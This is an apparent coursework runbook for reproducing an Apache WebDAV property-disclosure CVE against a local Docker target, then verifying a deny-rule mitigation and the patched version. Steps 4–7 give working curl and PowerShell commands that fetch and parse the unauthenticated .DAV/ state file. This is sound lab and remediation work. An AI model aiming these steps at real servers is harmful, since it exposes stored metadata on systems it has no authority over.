# CVE-2026-58415 — Apache WebDAV Property Disclosure: Reproduction Runbook

**Report section this covers:** Section 4 (CVE-2026-58415) and Appendices A.2, B.2,
C.2, D.2 of the INF2005 P3-6 ACW3 report.

**What this demonstrates:** on Apache httpd 2.4.0–2.4.68 with WebDAV enabled, a
remote, unauthenticated client can download `mod_dav_fs`'s internal state file
from the browsable `.DAV/` sub-folder and read stored WebDAV "dead property"
metadata it was never meant to see. Severity: **Medium, CVSS 5.3**
(`AV:N/AC:L/PR:N/UI:N/C:L/I:N/A:N`, CWE-200). Fixed in **2.4.69**.

This runbook is written to be followed top to bottom by a human tester. Each step
states **what you run**, **what you should see**, and the **report figure/command
ID** it produces, so your captured output drops straight into the report.

---

## 0. Prerequisites

| Requirement | Version used in the assessment |
|-------------|--------------------------------|
| Docker Desktop (WSL2 backend), Windows 11 host | Docker engine 29.9.2 |
| `curl` on the host | 8.21.0 (ships with Windows 10/11) |
| This repository branch | `xamp-apache-webdav` |

Run every command from the repository root (the folder containing `Dockerfile`,
`demo.txt`, `proppatch.xml`, `mitigation.conf`). The exploit commands are issued
from the **Windows host**; no credentials are supplied at any point.

Files used (all version-controlled on this branch):

- `Dockerfile` — builds the vulnerable target (httpd 2.4.68).
- `Dockerfile69` — builds the patched target (httpd 2.4.69) for the fix test.
- `demo.txt` — the resource uploaded to the collection (`public content only`).
- `proppatch.xml` — the PROPPATCH body that plants the marker property.
- `mitigation.conf` — the interim `LocationMatch` deny rule.

---

## 1. Build and run the vulnerable target  *(report Appendix A.2)*

```powershell
docker build -t dav-target .
docker run -d --name dav -p 127.0.0.1:8080:80 dav-target
```

**Expect:** the build completes and `docker run` prints a container ID. The target
is now reachable at `http://127.0.0.1:8080/`.

> Why the `chown www-data` in the Dockerfile matters: this image runs its workers
> as `www-data`, so the WebDAV state dirs must be owned by `www-data`. If they are
> not, the first PUT fails with HTTP 500 "Could not open the lock database". This
> is already handled in the repo's Dockerfile.

---

## 2. Confirm the target version and modules  *(command B2.1 → Figure B2.1)*

```powershell
docker exec dav httpd -v
docker exec dav httpd -M | findstr dav
```

**Expect:**
- `httpd -v` → `Server version: Apache/2.4.68 (Unix)`.
- `httpd -M` → lists `dav_module` and `dav_fs_module` (both **shared**/enabled).

*Capture as Figure B2.1.*

---

## 3. Confirm WebDAV is active  *(command B2.2 → Figure B2.2)*

```powershell
curl -i -X OPTIONS http://127.0.0.1:8080/webdav/
```

**Expect:** `HTTP/1.1 200 OK`, a `DAV: 1,2` response header, and an `Allow:`
header listing WebDAV methods (`PROPFIND`, `PROPPATCH`, `LOCK`, …).

> Use `-i` (not `-I`). `-I` forces a HEAD-style display that does not match an
> OPTIONS request and omits the headers you want to show.

*Capture as Figure B2.2.*

---

## 4. Create the resource and plant the marker property  *(command B2.3 → Figure B2.3)*

```powershell
curl -i -T demo.txt http://127.0.0.1:8080/webdav/demo.txt
curl -i -X PROPPATCH http://127.0.0.1:8080/webdav/demo.txt -H "Content-Type: application/xml" --data-binary "@proppatch.xml"
```

**Expect:**
- PUT → `HTTP/1.1 201 Created` (the resource now exists).
- PROPPATCH → `HTTP/1.1 207 Multi-Status`.

This stores a dead property `note` (namespace `urn:example`) with the value
`ACW3-VERIFY-MARKER owner=lab`. A correctly behaving server should only ever
return this via a legitimate WebDAV method (PROPFIND) — never via a plain GET of
a file. The planting of this property is what creates the `.DAV/` state file.

*Capture the PROPPATCH 207 as Figure B2.3.*

---

## 5. Discover the internal state file over HTTP  *(command B2.4 → Figure B2.4)*

```powershell
curl -i http://127.0.0.1:8080/webdav/.DAV/
```

**Expect:** `HTTP/1.1 200 OK` and an autoindex (directory listing) HTML body that
lists a single file named **`demo.txt`** — i.e. the state file is named after the
resource it describes. Directory indexing is on for the stock image and the
WebDAV block does not override it, so the `.DAV/` folder is browsable.

> The state filename depends on the storage backend. On this image's APR DBM
> backend it is a **single file named after the resource** (`demo.txt`), not a
> file called `properties` and not a `.pag`/`.dir` pair. Always read the real
> name from this listing rather than assuming it.

*Capture as Figure B2.4.*

---

## 6. Read the state file without authentication  *(command B2.5 → Figure B2.5)*

```powershell
curl -i http://127.0.0.1:8080/webdav/.DAV/demo.txt
curl -s http://127.0.0.1:8080/webdav/.DAV/demo.txt -o leaked.bin
```

**Expect:** `HTTP/1.1 200 OK` with a body of **12,288 bytes** — the raw
`mod_dav_fs` state database. The second command saves it locally as `leaked.bin`
for the string extraction in the next step.

*Capture the 200 + byte count as Figure B2.5. This is the disclosure.*

---

## 7. Recover the planted property value  *(command B2.6 → Figure B2.6)*

The state file is a binary DBM database, so extract its printable strings
(PowerShell equivalent of `strings | grep`). Adjust the path to wherever
`leaked.bin` was saved:

```powershell
$t=[Text.Encoding]::ASCII.GetString([IO.File]::ReadAllBytes("$PWD\leaked.bin")); ($t -split '[^ -~]+') | Select-String 'ACW3'
```

**Expect:** the output contains `ACW3-VERIFY-MARKER owner=lab`.

This confirms an unauthenticated client recovered WebDAV dead-property metadata
for a resource it has no authority to author. Impact is **confidentiality only**
of the stored metadata — no modification, no path traversal outside the state
directory, no denial of service was demonstrated.

*Capture as Figure B2.6.*

---

## 8. Apply the interim mitigation and re-test  *(command B2.7 → Figure B2.7)*

```powershell
docker cp mitigation.conf dav:/usr/local/apache2/conf/mitigation.conf
docker exec dav sh -c "echo 'Include conf/mitigation.conf' >> conf/httpd.conf"
docker exec dav apachectl -k graceful
curl -i http://127.0.0.1:8080/webdav/.DAV/demo.txt
curl -i -X PROPFIND http://127.0.0.1:8080/webdav/demo.txt -H "Depth: 0"
```

The mitigation (`mitigation.conf`) is:

```apache
<LocationMatch "(^|/)\.DAV">
    Require all denied
</LocationMatch>
```

**Expect (this is the whole point of the fix):**
- GET of `/webdav/.DAV/demo.txt` → `HTTP/1.1 403 Forbidden` (disclosure blocked).
- PROPFIND of `/webdav/demo.txt` → `HTTP/1.1 207 Multi-Status` (legitimate WebDAV
  still works — the rule is surgical).

> Copy the rule in as a **file** and `Include` it, as shown. Appending the
> `<LocationMatch …>` block directly via `docker exec … sh -c 'printf …'` mangles
> the regex because the shell reads `<` as a redirect.

*Capture both responses as Figure B2.7. This is the "before/after" in Appendix D.2.*

---

## 9. Verify the permanent fix — upgrade to 2.4.69  *(report Appendix D.2)*

Build and run the patched target **separately**, on a different port, with no
mitigation applied:

```powershell
docker build -f Dockerfile69 -t dav-target-69 .
docker run -d --name dav69 -p 127.0.0.1:8081:80 dav-target-69
```

Repeat the key steps against port **8081**:

```powershell
docker exec dav69 httpd -v
curl -i -T demo.txt http://127.0.0.1:8081/webdav/demo.txt
curl -i -X PROPPATCH http://127.0.0.1:8081/webdav/demo.txt -H "Content-Type: application/xml" --data-binary "@proppatch.xml"
curl -i http://127.0.0.1:8081/webdav/.DAV/
curl -i http://127.0.0.1:8081/webdav/.DAV/demo.txt
curl -i -X PROPFIND http://127.0.0.1:8081/webdav/demo.txt -H "Depth: 0"
```

**Expect:**
- `httpd -v` → `Apache/2.4.69` *(evidence D1)*.
- PUT → 201, PROPPATCH → 207 — WebDAV still functional *(evidence D2)*.
- GET of `/webdav/.DAV/` **and** of `/webdav/.DAV/demo.txt` → **HTTP 403** with no
  workaround present — the exposure is fixed at source *(evidence D3)*.
- PROPFIND → 207, the `note` property still retrievable the proper way *(D4)*.

---

## 10. Reset / teardown  *(report Appendix A.2)*

```powershell
docker rm -f dav dav69
docker rmi dav-target dav-target-69
```

---

## Expected-results summary (quick reference)

| Step | Command ID | Action | Expected result |
|------|-----------|--------|-----------------|
| 2 | B2.1 | `httpd -v` / `-M` | Apache/2.4.68; `dav_module`, `dav_fs_module` loaded |
| 3 | B2.2 | `OPTIONS /webdav/` | 200, `DAV: 1,2`, Allow lists WebDAV methods |
| 4 | B2.3 | PUT + PROPPATCH | 201, then 207 |
| 5 | B2.4 | GET `/webdav/.DAV/` | 200, listing shows `demo.txt` |
| 6 | B2.5 | GET `/webdav/.DAV/demo.txt` | 200, 12,288-byte body |
| 7 | B2.6 | string extraction | `ACW3-VERIFY-MARKER owner=lab` recovered |
| 8 | B2.7 | mitigation + re-test | 403 on state file; PROPFIND still 207 |
| 9 | D1–D4 | 2.4.69 rebuild | 403 on state file with no workaround; WebDAV still 207 |

All steps above (1–10, including the 2.4.69 permanent-fix test) were re-verified
end to end against live Docker builds on 2026-10-23, and the 2.4.68 exploit and
mitigation were originally verified on 2026-10-22. Every expected result matched.

---

## Notes from live testing (2026-10-22)

These are corrections we made after building and running the target, kept here so
the steps above are known-good rather than assumed. The CVE facts (affected
2.4.0–2.4.68, fixed 2.4.69, CVSS 5.3 Medium, unauthenticated read of WebDAV dead
properties) were confirmed against Red Hat / SUSE / Debian / OpenCVE.

1. **State-dir ownership must be `www-data`, not `daemon`.** This httpd image runs
   its workers as `www-data` (its shipped `httpd.conf` has `User www-data` /
   `Group www-data`). With the dirs owned by `daemon`, the first PUT fails with
   HTTP 500 "Could not open the lock database". The repo Dockerfile already uses
   `www-data`. (Older httpd images used `daemon`, which is where the stale value
   came from.)

2. **The state file is named after the resource (`demo.txt`), not `properties`.**
   Verified by `ls` inside the container: a single 12,288-byte file at
   `htdocs/webdav/.DAV/demo.txt`. It is **not** a file called `properties` and
   **not** a `.pag`/`.dir` SDBM pair on this APR build — read the real name from
   the `/webdav/.DAV/` listing (step 5) rather than hard-coding it.

3. **Use `curl -i -X OPTIONS`, not `-I -X OPTIONS`.** `-I` forces HEAD-style
   output that doesn't match an OPTIONS request; `-i` returns the `DAV: 1,2` and
   full `Allow:` list correctly.

4. **Apply the mitigation as a file + `Include`, never via `printf`.** Appending
   the `<LocationMatch …>` block with `docker exec … sh -c 'printf …'` mangles the
   regex because the shell reads `<` as a redirect. Step 8 copies `mitigation.conf`
   in and `Include`s it to avoid this.
